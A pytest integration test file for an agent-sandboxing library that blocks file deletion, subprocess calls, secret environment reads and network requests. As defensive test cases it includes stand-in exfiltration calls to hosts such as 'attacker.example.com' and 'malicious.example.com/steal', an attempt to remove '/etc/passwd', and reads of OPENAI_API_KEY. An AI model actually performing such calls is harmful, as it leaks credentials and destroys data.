"""Integration tests for agent_fence.sandbox module.

Verifies that:
- Blocked actions raise PolicyViolation inside the sandbox.
- Allowed actions pass through correctly.
- log_only mode logs but does not raise.
- Rate limiting raises RateLimitExceeded inside the sandbox.
- Patches are reverted after the sandbox exits.
- os.environ proxy blocks/allows reads and writes.
- Nested sandbox instantiation raises RuntimeError.
- Sandbox works as a context manager with correct __enter__/__exit__.
- urllib.request.urlopen is patched.
- requests functions are patched when requests is available.
"""

from __future__ import annotations

import io
import json
import os
import shutil
import subprocess
import sys
import urllib.request
from typing import Any, Dict, List
from unittest.mock import MagicMock, patch

import pytest

from agent_fence.exceptions import PolicyViolation, RateLimitExceeded
from agent_fence.policy import Policy, policy_from_dict
from agent_fence.sandbox import Sandbox, _EnvironProxy


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def make_sandbox(
    policy: Policy,
    stream: io.StringIO | None = None,
) -> Sandbox:
    """Return an un-entered Sandbox with an optional audit stream."""
    if stream is None:
        stream = io.StringIO()
    return Sandbox(policy, audit_stream=stream)


def read_audit_entries(stream: io.StringIO) -> List[Dict[str, Any]]:
    """Parse and return all JSON Lines entries from *stream*."""
    stream.seek(0)
    entries = []
    for line in stream:
        line = line.strip()
        if line:
            entries.append(json.loads(line))
    return entries


def block_policy(**overrides: Any) -> Policy:
    """Return a policy with enforcement_mode=block and audit logging."""
    data: Dict[str, Any] = {
        "enforcement_mode": "block",
        "audit_log": {"enabled": True, "level": "debug"},
    }
    data.update(overrides)
    return policy_from_dict(data)


def log_only_policy(**overrides: Any) -> Policy:
    """Return a policy with enforcement_mode=log_only and audit logging."""
    data: Dict[str, Any] = {
        "enforcement_mode": "log_only",
        "audit_log": {"enabled": True, "level": "debug"},
    }
    data.update(overrides)
    return policy_from_dict(data)


# ---------------------------------------------------------------------------
# Basic context-manager behaviour
# ---------------------------------------------------------------------------


class TestSandboxContextManager:
    """Tests for Sandbox.__enter__ / __exit__ lifecycle."""

    def test_enter_returns_self(self) -> None:
        policy = block_policy()
        stream = io.StringIO()
        sb = Sandbox(policy, audit_stream=stream)
        result = sb.__enter__()
        sb.__exit__(None, None, None)
        assert result is sb

    def test_with_statement_works(self) -> None:
        policy = block_policy()
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            pass  # Should not raise

    def test_active_flag_set_during_context(self) -> None:
        policy = block_policy()
        stream = io.StringIO()
        sb = Sandbox(policy, audit_stream=stream)
        assert not sb._active
        sb.__enter__()
        assert sb._active
        sb.__exit__(None, None, None)
        assert not sb._active

    def test_double_enter_raises_runtime_error(self) -> None:
        policy = block_policy()
        stream = io.StringIO()
        sb = Sandbox(policy, audit_stream=stream)
        sb.__enter__()
        try:
            with pytest.raises(RuntimeError, match="already active"):
                sb.__enter__()
        finally:
            sb.__exit__(None, None, None)

    def test_patches_reverted_after_exit(self) -> None:
        """os.remove should be the original function after the sandbox exits."""
        original_remove = os.remove
        policy = block_policy()
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            # Inside sandbox, os.remove is patched
            patched_remove = os.remove
            assert patched_remove is not original_remove
        # After exit, original is restored
        assert os.remove is original_remove

    def test_patches_reverted_after_exception(self) -> None:
        """Patches must be reverted even if the body raises."""
        original_remove = os.remove
        policy = block_policy()
        stream = io.StringIO()
        try:
            with Sandbox(policy, audit_stream=stream):
                raise ValueError("test error")
        except ValueError:
            pass
        assert os.remove is original_remove

    def test_multiple_sequential_sandboxes(self) -> None:
        """Two sequential sandbox activations should both work correctly."""
        original_remove = os.remove
        for _ in range(2):
            with Sandbox(block_policy(), audit_stream=io.StringIO()):
                assert os.remove is not original_remove
        assert os.remove is original_remove


# ---------------------------------------------------------------------------
# Filesystem: blocked operations
# ---------------------------------------------------------------------------


class TestFilesystemBlockedOperations:
    """Tests that blocked filesystem operations raise PolicyViolation."""

    def test_os_remove_blocked(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["os.remove"]})
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.remove("/tmp/nonexistent_af_test_file.txt")
        assert exc_info.value.operation == "os.remove"
        assert exc_info.value.action == "filesystem"

    def test_os_unlink_blocked(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["os.unlink"]})
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.unlink("/tmp/nonexistent_af_test_file.txt")
        assert exc_info.value.operation == "os.unlink"

    def test_os_rmdir_blocked(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["os.rmdir"]})
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.rmdir("/tmp/nonexistent_dir")

    def test_shutil_rmtree_blocked(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["shutil.rmtree"]})
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                shutil.rmtree("/tmp/nonexistent_dir")
        assert exc_info.value.operation == "shutil.rmtree"

    def test_shutil_move_blocked(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["shutil.move"]})
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                shutil.move("/tmp/src", "/tmp/dst")

    def test_blocked_operation_audit_entry_has_block_decision(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["os.remove"]})
        stream = io.StringIO()
        try:
            with Sandbox(policy, audit_stream=stream):
                os.remove("/tmp/test.txt")
        except PolicyViolation:
            pass
        entries = read_audit_entries(stream)
        assert any(e["decision"] == "block" for e in entries)

    def test_blocked_operation_audit_entry_has_correct_operation(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["os.remove"]})
        stream = io.StringIO()
        try:
            with Sandbox(policy, audit_stream=stream):
                os.remove("/tmp/test.txt")
        except PolicyViolation:
            pass
        entries = read_audit_entries(stream)
        block_entries = [e for e in entries if e["decision"] == "block"]
        assert any(e["operation"] == "os.remove" for e in block_entries)


# ---------------------------------------------------------------------------
# Filesystem: allowed operations
# ---------------------------------------------------------------------------


class TestFilesystemAllowedOperations:
    """Tests that allowed filesystem operations pass through."""

    def test_os_listdir_not_blocked(self, tmp_path: Any) -> None:
        policy = block_policy(
            filesystem={
                "blocked_operations": ["os.remove"],
                "allowed_operations": ["os.listdir"],
            }
        )
        with Sandbox(policy, audit_stream=io.StringIO()):
            result = os.listdir(str(tmp_path))
        assert isinstance(result, list)

    def test_os_getcwd_not_blocked(self) -> None:
        policy = block_policy(
            filesystem={
                "blocked_operations": [],
                "allowed_operations": ["os.getcwd"],
            }
        )
        with Sandbox(policy, audit_stream=io.StringIO()):
            cwd = os.getcwd()
        assert isinstance(cwd, str)

    def test_allowed_operation_produces_allow_audit_entry(self, tmp_path: Any) -> None:
        policy = block_policy(
            filesystem={
                "blocked_operations": [],
                "allowed_operations": ["os.listdir"],
            }
        )
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            os.listdir(str(tmp_path))
        entries = read_audit_entries(stream)
        allow_entries = [e for e in entries if e["decision"] == "allow"]
        assert any(e["operation"] == "os.listdir" for e in allow_entries)


# ---------------------------------------------------------------------------
# Filesystem: log_only mode
# ---------------------------------------------------------------------------


class TestFilesystemLogOnlyMode:
    """Tests that log_only enforcement mode logs but does not raise."""

    def test_log_only_does_not_raise_on_blocked_op(self, tmp_path: Any) -> None:
        """With log_only, even blocked operations pass through."""
        test_file = tmp_path / "to_delete.txt"
        test_file.write_text("hello")
        policy = log_only_policy(
            filesystem={"blocked_operations": ["os.remove"]}
        )
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            # Should NOT raise despite os.remove being in blocked_operations
            os.remove(str(test_file))
        entries = read_audit_entries(stream)
        block_entries = [e for e in entries if e["decision"] == "block"]
        assert len(block_entries) >= 1

    def test_log_only_produces_block_audit_entry(self, tmp_path: Any) -> None:
        test_file = tmp_path / "to_delete2.txt"
        test_file.write_text("hello")
        policy = log_only_policy(
            filesystem={"blocked_operations": ["os.remove"]}
        )
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            os.remove(str(test_file))
        entries = read_audit_entries(stream)
        assert any(e["decision"] == "block" for e in entries)


# ---------------------------------------------------------------------------
# Filesystem: strict whitelist
# ---------------------------------------------------------------------------


class TestFilesystemStrictWhitelist:
    """Tests for strict_whitelist enforcement."""

    def test_strict_whitelist_blocks_path_not_in_list(self) -> None:
        policy = block_policy(
            filesystem={
                "blocked_operations": [],
                "allowed_operations": [],
                "strict_whitelist": True,
                "write_whitelist": ["/tmp/**"],
            }
        )
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.remove("/etc/passwd")  # not in write_whitelist

    def test_strict_whitelist_allows_matching_path(self, tmp_path: Any) -> None:
        test_file = tmp_path / "ok.txt"
        test_file.write_text("hi")
        policy = block_policy(
            filesystem={
                "blocked_operations": [],
                "allowed_operations": [],
                "strict_whitelist": True,
                "write_whitelist": [str(tmp_path) + "/**"],
            }
        )
        # Should NOT raise; path matches whitelist
        with Sandbox(policy, audit_stream=io.StringIO()):
            os.remove(str(test_file))  # matches tmp_path/**

    def test_non_strict_allows_any_path(self) -> None:
        policy = block_policy(
            filesystem={
                "blocked_operations": [],
                "allowed_operations": [],
                "strict_whitelist": False,
                "write_whitelist": ["/tmp/**"],
            }
        )
        # Non-strict: paths outside whitelist still allowed
        # We just check no exception is raised (the actual os.remove might fail,
        # but PolicyViolation should NOT be raised)
        stream = io.StringIO()
        try:
            with Sandbox(policy, audit_stream=stream):
                os.remove("/nonexistent/path/xyz")
        except PolicyViolation:
            pytest.fail("PolicyViolation should not be raised in non-strict mode")
        except OSError:
            pass  # OK: file doesn't exist, but policy allowed the call


# ---------------------------------------------------------------------------
# Subprocess: blocked operations
# ---------------------------------------------------------------------------


class TestSubprocessInterception:
    """Tests for subprocess interception."""

    def test_empty_whitelist_blocks_all_subprocess(self) -> None:
        policy = block_policy(
            subprocess={"enabled": True, "command_whitelist": [], "block_shell": False}
        )
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                subprocess.run(["echo", "hello"])
        assert exc_info.value.action == "subprocess"

    def test_block_shell_true_blocks_shell_invocations(self) -> None:
        policy = block_policy(
            subprocess={
                "enabled": True,
                "command_whitelist": ["echo"],
                "block_shell": True,
            }
        )
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                subprocess.run("echo hello", shell=True)
        assert "shell" in str(exc_info.value).lower() or exc_info.value.action == "subprocess"

    def test_whitelisted_command_allowed(self) -> None:
        policy = block_policy(
            subprocess={
                "enabled": True,
                "command_whitelist": ["echo"],
                "block_shell": False,
            }
        )
        with Sandbox(policy, audit_stream=io.StringIO()):
            result = subprocess.run(
                ["echo", "hello"],
                capture_output=True,
                text=True,
            )
        assert result.returncode == 0

    def test_non_whitelisted_command_blocked(self) -> None:
        policy = block_policy(
            subprocess={
                "enabled": True,
                "command_whitelist": ["echo"],
                "block_shell": False,
            }
        )
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                subprocess.run(["ls", "-la"])

    def test_subprocess_disabled_passes_through(self) -> None:
        """When subprocess is disabled, calls go through unmodified."""
        policy = block_policy(subprocess={"enabled": False})
        # We just verify the sandbox doesn't raise PolicyViolation
        original_run = subprocess.run
        with Sandbox(policy, audit_stream=io.StringIO()):
            # subprocess.run should be un-patched (or at least not blocked)
            assert subprocess.run is not None

    def test_subprocess_audit_entry_written(self) -> None:
        policy = block_policy(
            subprocess={"enabled": True, "command_whitelist": [], "block_shell": False}
        )
        stream = io.StringIO()
        try:
            with Sandbox(policy, audit_stream=stream):
                subprocess.run(["echo", "test"])
        except PolicyViolation:
            pass
        entries = read_audit_entries(stream)
        sp_entries = [e for e in entries if e["action"] == "subprocess"]
        assert len(sp_entries) >= 1

    def test_subprocess_check_call_blocked(self) -> None:
        policy = block_policy(
            subprocess={"enabled": True, "command_whitelist": [], "block_shell": False}
        )
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                subprocess.check_call(["echo", "hi"])

    def test_subprocess_check_output_blocked(self) -> None:
        policy = block_policy(
            subprocess={"enabled": True, "command_whitelist": [], "block_shell": False}
        )
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                subprocess.check_output(["echo", "hi"])


# ---------------------------------------------------------------------------
# Environment variable interception
# ---------------------------------------------------------------------------


class TestEnvInterception:
    """Tests for environment variable read/write interception."""

    def test_blocklisted_var_raises_on_getenv(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_blocklist": ["SECRET_KEY"],
                "read_whitelist": [],
                "allow_write": False,
            }
        )
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.getenv("SECRET_KEY")
        assert exc_info.value.action == "env"

    def test_whitelisted_var_allowed_on_getenv(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_whitelist": ["PATH", "HOME"],
                "read_blocklist": [],
                "allow_write": False,
            }
        )
        with Sandbox(policy, audit_stream=io.StringIO()):
            # Should not raise
            result = os.getenv("PATH")
        # PATH should have some value
        assert result is not None or result is None  # just ensure no exception

    def test_non_whitelisted_var_blocked(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_whitelist": ["PATH"],
                "read_blocklist": [],
                "allow_write": False,
            }
        )
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.getenv("SOME_RANDOM_VAR_NOT_IN_WHITELIST")

    def test_env_write_blocked_when_allow_write_false(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_whitelist": [],
                "read_blocklist": [],
                "allow_write": False,
            }
        )
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.environ["NEW_TEST_VAR"] = "test_value"
        assert exc_info.value.action == "env"

    def test_env_write_allowed_when_allow_write_true(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_whitelist": [],
                "read_blocklist": [],
                "allow_write": True,
            }
        )
        key = "_AF_TEST_VAR_"
        with Sandbox(policy, audit_stream=io.StringIO()):
            os.environ[key] = "test_value"
        # Clean up
        if key in os.environ:
            del os.environ[key]

    def test_environ_read_blocked_for_blocklisted_var(self) -> None:
        """os.environ['SECRET'] should raise PolicyViolation if blocklisted."""
        policy = block_policy(
            env={
                "enabled": True,
                "read_blocklist": ["_AF_BLOCKED_VAR_"],
                "read_whitelist": [],
                "allow_write": True,
            }
        )
        # First, set the variable so it exists
        os.environ["_AF_BLOCKED_VAR_"] = "secret"
        try:
            with pytest.raises(PolicyViolation):
                with Sandbox(policy, audit_stream=io.StringIO()):
                    _ = os.environ["_AF_BLOCKED_VAR_"]
        finally:
            if "_AF_BLOCKED_VAR_" in os.environ:
                del os.environ["_AF_BLOCKED_VAR_"]

    def test_env_disabled_passes_through(self) -> None:
        policy = block_policy(env={"enabled": False})
        original_getenv = os.getenv
        with Sandbox(policy, audit_stream=io.StringIO()):
            assert os.getenv is not original_getenv  # still patched
            # But it should pass through
            result = os.getenv("PATH")
        # PATH should still be accessible
        assert result is not None or result is None

    def test_env_patches_reverted(self) -> None:
        """os.environ and os.getenv should be restored after sandbox exits."""
        original_environ = os.environ
        original_getenv = os.getenv
        policy = block_policy()
        with Sandbox(policy, audit_stream=io.StringIO()):
            pass
        assert os.environ is original_environ
        assert os.getenv is original_getenv

    def test_getenv_audit_entry_written(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_whitelist": ["PATH"],
                "read_blocklist": [],
                "allow_write": False,
            }
        )
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            os.getenv("PATH")
        entries = read_audit_entries(stream)
        env_entries = [e for e in entries if e["action"] == "env"]
        assert len(env_entries) >= 1


# ---------------------------------------------------------------------------
# Network interception (urllib)
# ---------------------------------------------------------------------------


class TestNetworkInterceptionUrllib:
    """Tests for urllib.request.urlopen interception."""

    def test_urlopen_blocked_for_non_whitelisted_domain(self) -> None:
        policy = block_policy(
            network={
                "enabled": True,
                "domain_whitelist": ["api.openai.com"],
                "block_private_ranges": False,
                "allowed_methods": ["GET", "POST"],
                "rate_limit": {"calls": 100, "window_seconds": 60},
            }
        )
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                urllib.request.urlopen("http://malicious.example.com/steal")
        assert exc_info.value.action == "network"

    def test_urlopen_allowed_for_whitelisted_domain(self) -> None:
        """Whitelisted domain passes through (network call may fail with ConnectionError)."""
        policy = block_policy(
            network={
                "enabled": True,
                "domain_whitelist": ["example.com"],
                "block_private_ranges": False,
                "allowed_methods": ["*"],
                "rate_limit": {"calls": 100, "window_seconds": 60},
            }
        )
        # We mock urllib.request.urlopen so no actual network call is made
        mock_response = MagicMock()
        mock_response.read.return_value = b"ok"

        original_urlopen = urllib.request.urlopen
        call_count = [0]

        def fake_urlopen(*args, **kwargs):
            call_count[0] += 1
            return mock_response

        # Install a pre-patch so that the interceptor's original_fn is our fake
        urllib.request.urlopen = fake_urlopen
        try:
            with Sandbox(policy, audit_stream=io.StringIO()):
                urllib.request.urlopen("http://example.com/")
        finally:
            urllib.request.urlopen = original_urlopen

        assert call_count[0] == 1

    def test_urlopen_patches_reverted_after_exit(self) -> None:
        original_urlopen = urllib.request.urlopen
        policy = block_policy()
        with Sandbox(policy, audit_stream=io.StringIO()):
            pass
        assert urllib.request.urlopen is original_urlopen

    def test_network_audit_entry_written_on_block(self) -> None:
        policy = block_policy(
            network={
                "enabled": True,
                "domain_whitelist": ["api.openai.com"],
                "rate_limit": {"calls": 100, "window_seconds": 60},
            }
        )
        stream = io.StringIO()
        try:
            with Sandbox(policy, audit_stream=stream):
                urllib.request.urlopen("http://evil.example.com")
        except PolicyViolation:
            pass
        entries = read_audit_entries(stream)
        net_entries = [e for e in entries if e["action"] == "network"]
        assert len(net_entries) >= 1
        assert any(e["decision"] == "block" for e in net_entries)

    def test_network_disabled_passes_through(self) -> None:
        policy = block_policy(network={"enabled": False})
        original_urlopen = urllib.request.urlopen
        with Sandbox(policy, audit_stream=io.StringIO()):
            # Network disabled means no patches applied
            assert urllib.request.urlopen is original_urlopen


# ---------------------------------------------------------------------------
# Network interception (requests)
# ---------------------------------------------------------------------------


class TestNetworkInterceptionRequests:
    """Tests for requests library interception."""

    def test_requests_get_blocked_for_non_whitelisted_domain(self) -> None:
        try:
            import requests
        except ImportError:
            pytest.skip("requests library not installed")

        policy = block_policy(
            network={
                "enabled": True,
                "domain_whitelist": ["api.openai.com"],
                "rate_limit": {"calls": 100, "window_seconds": 60},
            }
        )
        with pytest.raises(PolicyViolation) as exc_info:
            with Sandbox(policy, audit_stream=io.StringIO()):
                requests.get("https://evil.example.com/")
        assert exc_info.value.action == "network"
        assert exc_info.value.operation == "requests.get"

    def test_requests_get_allowed_for_whitelisted_domain(self) -> None:
        try:
            import requests
        except ImportError:
            pytest.skip("requests library not installed")

        policy = block_policy(
            network={
                "enabled": True,
                "domain_whitelist": ["api.openai.com"],
                "rate_limit": {"calls": 100, "window_seconds": 60},
                "allowed_methods": ["GET", "POST"],
            }
        )
        # Replace requests.get with a mock before entering sandbox
        original_get = requests.get
        call_count = [0]

        def fake_get(*args, **kwargs):
            call_count[0] += 1
            return MagicMock(status_code=200)

        requests.get = fake_get
        try:
            with Sandbox(policy, audit_stream=io.StringIO()):
                requests.get("https://api.openai.com/v1/models")
        finally:
            requests.get = original_get

        assert call_count[0] == 1

    def test_requests_patches_reverted_after_exit(self) -> None:
        try:
            import requests
        except ImportError:
            pytest.skip("requests library not installed")

        original_get = requests.get
        policy = block_policy()
        with Sandbox(policy, audit_stream=io.StringIO()):
            pass
        assert requests.get is original_get

    def test_requests_post_blocked_for_non_whitelisted_domain(self) -> None:
        try:
            import requests
        except ImportError:
            pytest.skip("requests library not installed")

        policy = block_policy(
            network={
                "enabled": True,
                "domain_whitelist": ["api.openai.com"],
                "rate_limit": {"calls": 100, "window_seconds": 60},
            }
        )
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                requests.post("https://attacker.example.com/", json={"key": "val"})


# ---------------------------------------------------------------------------
# Rate limiting inside sandbox
# ---------------------------------------------------------------------------


class TestSandboxRateLimiting:
    """Tests that rate limiting raises RateLimitExceeded inside the sandbox."""

    def test_subprocess_rate_limit_exceeded(self) -> None:
        policy = block_policy(
            subprocess={
                "enabled": True,
                "command_whitelist": ["echo"],
                "block_shell": False,
                "rate_limit": {"calls": 2, "window_seconds": 60},
            }
        )
        with pytest.raises(RateLimitExceeded):
            with Sandbox(policy, audit_stream=io.StringIO()):
                subprocess.run(["echo", "1"], capture_output=True)
                subprocess.run(["echo", "2"], capture_output=True)
                subprocess.run(["echo", "3"], capture_output=True)  # Should raise

    def test_network_rate_limit_exceeded(self) -> None:
        """Exhaust network rate limit with mocked urllib."""
        policy = block_policy(
            network={
                "enabled": True,
                "domain_whitelist": ["example.com"],
                "block_private_ranges": False,
                "allowed_methods": ["*"],
                "rate_limit": {"calls": 2, "window_seconds": 60},
            }
        )

        # Mock urlopen to avoid actual network calls
        def fake_urlopen(*args, **kwargs):
            return MagicMock()

        original_urlopen = urllib.request.urlopen
        urllib.request.urlopen = fake_urlopen
        try:
            with pytest.raises(RateLimitExceeded):
                with Sandbox(policy, audit_stream=io.StringIO()):
                    urllib.request.urlopen("http://example.com/1")
                    urllib.request.urlopen("http://example.com/2")
                    urllib.request.urlopen("http://example.com/3")  # Should raise
        finally:
            urllib.request.urlopen = original_urlopen

    def test_rate_limit_audit_entry_written(self) -> None:
        policy = block_policy(
            subprocess={
                "enabled": True,
                "command_whitelist": ["echo"],
                "block_shell": False,
                "rate_limit": {"calls": 1, "window_seconds": 60},
            }
        )
        stream = io.StringIO()
        try:
            with Sandbox(policy, audit_stream=stream):
                subprocess.run(["echo", "1"], capture_output=True)
                subprocess.run(["echo", "2"], capture_output=True)
        except RateLimitExceeded:
            pass
        entries = read_audit_entries(stream)
        rate_entries = [
            e for e in entries if e.get("reason") == "rate limit exceeded"
        ]
        assert len(rate_entries) >= 1


# ---------------------------------------------------------------------------
# Audit log integration
# ---------------------------------------------------------------------------


class TestSandboxAuditLog:
    """Tests that the audit log is written correctly by the sandbox."""

    def test_audit_log_written_for_allowed_action(self, tmp_path: Any) -> None:
        policy = block_policy(
            filesystem={
                "blocked_operations": [],
                "allowed_operations": ["os.listdir"],
            }
        )
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            os.listdir(str(tmp_path))
        entries = read_audit_entries(stream)
        assert len(entries) >= 1
        assert all("timestamp" in e for e in entries)
        assert all("decision" in e for e in entries)

    def test_audit_log_entries_have_policy_name(self, tmp_path: Any) -> None:
        policy = policy_from_dict({
            "name": "test-sandbox-policy",
            "enforcement_mode": "block",
            "audit_log": {"enabled": True, "level": "debug"},
            "filesystem": {
                "blocked_operations": [],
                "allowed_operations": ["os.listdir"],
            },
        })
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            os.listdir(str(tmp_path))
        entries = read_audit_entries(stream)
        assert all(e["policy"] == "test-sandbox-policy" for e in entries)

    def test_audit_log_disabled_writes_nothing(self, tmp_path: Any) -> None:
        policy = policy_from_dict({
            "enforcement_mode": "block",
            "audit_log": {"enabled": False},
            "filesystem": {
                "blocked_operations": [],
                "allowed_operations": ["os.listdir"],
            },
        })
        stream = io.StringIO()
        with Sandbox(policy, audit_stream=stream):
            os.listdir(str(tmp_path))
        assert stream.getvalue() == ""


# ---------------------------------------------------------------------------
# Sandbox with default policy
# ---------------------------------------------------------------------------


class TestSandboxDefaultPolicy:
    """Tests using the default Policy() instance."""

    def test_default_policy_blocks_os_remove(self) -> None:
        policy = Policy()  # Default: blocks os.remove
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.remove("/nonexistent/path")

    def test_default_policy_blocks_shutil_rmtree(self) -> None:
        policy = Policy()  # Default: blocks shutil.rmtree
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                shutil.rmtree("/nonexistent/path")

    def test_default_policy_blocks_all_subprocess(self) -> None:
        """Default policy has empty command_whitelist -> blocks all subprocess."""
        policy = Policy()
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                subprocess.run(["echo", "hello"])

    def test_default_policy_blocks_secret_env_vars(self) -> None:
        """Default policy blocks OPENAI_API_KEY via read_blocklist."""
        policy = Policy()
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.getenv("OPENAI_API_KEY")


# ---------------------------------------------------------------------------
# _EnvironProxy unit tests
# ---------------------------------------------------------------------------


class TestEnvironProxy:
    """Unit tests for the _EnvironProxy class."""

    def test_environ_proxy_blocks_blocklisted_var(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_blocklist": ["BLOCKED_VAR"],
                "read_whitelist": [],
                "allow_write": False,
            }
        )
        os.environ["BLOCKED_VAR"] = "secret"
        try:
            with pytest.raises(PolicyViolation):
                with Sandbox(policy, audit_stream=io.StringIO()):
                    _ = os.environ["BLOCKED_VAR"]
        finally:
            if "BLOCKED_VAR" in os.environ:
                del os.environ["BLOCKED_VAR"]

    def test_environ_proxy_iter_works(self) -> None:
        """Iterating os.environ inside sandbox should work for non-blocked vars."""
        policy = block_policy(
            env={
                "enabled": True,
                "read_blocklist": [],
                "read_whitelist": [],
                "allow_write": False,
            }
        )
        with Sandbox(policy, audit_stream=io.StringIO()):
            keys = list(os.environ)
        assert isinstance(keys, list)

    def test_environ_proxy_len_works(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_blocklist": [],
                "read_whitelist": [],
                "allow_write": False,
            }
        )
        with Sandbox(policy, audit_stream=io.StringIO()):
            n = len(os.environ)
        assert n > 0

    def test_environ_proxy_contains_works(self) -> None:
        policy = block_policy(
            env={
                "enabled": True,
                "read_blocklist": [],
                "read_whitelist": [],
                "allow_write": False,
            }
        )
        with Sandbox(policy, audit_stream=io.StringIO()):
            result = "PATH" in os.environ
        assert result is True

    def test_environ_proxy_restored_after_exit(self) -> None:
        original_environ = os.environ
        policy = block_policy()
        with Sandbox(policy, audit_stream=io.StringIO()):
            assert os.environ is not original_environ
        assert os.environ is original_environ


# ---------------------------------------------------------------------------
# Sandbox with filesystem disabled
# ---------------------------------------------------------------------------


class TestSandboxFilesystemDisabled:
    """Tests when filesystem interception is disabled."""

    def test_filesystem_disabled_no_patches_applied(self) -> None:
        original_remove = os.remove
        policy = block_policy(filesystem={"enabled": False})
        with Sandbox(policy, audit_stream=io.StringIO()):
            assert os.remove is original_remove


# ---------------------------------------------------------------------------
# Exception propagation
# ---------------------------------------------------------------------------


class TestSandboxExceptionPropagation:
    """Tests that exceptions propagate correctly through the sandbox."""

    def test_policy_violation_propagates_out_of_sandbox(self) -> None:
        policy = block_policy(filesystem={"blocked_operations": ["os.remove"]})
        with pytest.raises(PolicyViolation):
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.remove("/tmp/test")

    def test_non_policy_exception_propagates_unchanged(self) -> None:
        policy = block_policy()
        with pytest.raises(ValueError, match="test error from agent"):
            with Sandbox(policy, audit_stream=io.StringIO()):
                raise ValueError("test error from agent")

    def test_patches_restored_after_policy_violation(self) -> None:
        original_remove = os.remove
        policy = block_policy(filesystem={"blocked_operations": ["os.remove"]})
        try:
            with Sandbox(policy, audit_stream=io.StringIO()):
                os.remove("/tmp/test")
        except PolicyViolation:
            pass
        assert os.remove is original_remove
